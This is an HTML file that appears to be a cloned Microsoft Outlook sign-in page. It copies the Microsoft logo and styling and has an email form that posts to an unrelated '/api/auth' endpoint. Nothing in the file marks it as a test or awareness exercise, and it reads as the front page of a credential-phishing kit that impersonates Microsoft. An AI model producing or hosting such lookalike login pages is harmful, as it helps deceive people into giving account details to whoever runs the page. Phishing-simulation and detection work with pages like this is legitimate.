<!DOCTYPE html>
<html>
<head>
    <title>Sign in - Outlook</title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; margin: 0; background: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-box { background: white; padding: 44px; width: 440px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
        .logo { margin-bottom: 16px; }
        .logo img { height: 24px; }
        h1 { font-size: 24px; font-weight: 600; margin: 0 0 24px 0; }
        input[type="email"], input[type="password"] { width: 100%; padding: 12px; margin: 8px 0 16px 0; border: 1px solid #666; font-size: 15px; box-sizing: border-box; }
        input:focus { border-color: #0078d4; outline: none; }
        button { background: #0078d4; color: white; border: none; padding: 12px 24px; font-size: 15px; cursor: pointer; width: 100%; }
        button:hover { background: #106ebe; }
        .forgot { margin-top: 16px; }
        .forgot a { color: #0078d4; text-decoration: none; font-size: 13px; }
        .footer { margin-top: 24px; font-size: 12px; color: #666; }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="logo">
            <svg height="24" viewBox="0 0 108 24"><path fill="#f25022" d="M0 0h11v11H0z"/><path fill="#7fba00" d="M12 0h11v11H12z"/><path fill="#00a4ef" d="M0 12h11v11H0z"/><path fill="#ffb900" d="M12 12h11v11H12z"/><text x="28" y="18" fill="#333" font-family="Segoe UI" font-size="18">Outlook</text></svg>
        </div>
        <h1>Sign in</h1>
        <form action="/api/auth" method="post">
            <input type="email" name="email" placeholder="Email, phone, or Skype" required>
            <button type="submit">Next</button>
        </form>
        <div class="forgot">
            <a href="#">Can't access your account?</a>
        </div>
        <div class="footer">
            <a href="#">Privacy & cookies</a> | <a href="#">Terms of use</a>
        </div>
    </div>
</body>
</html>
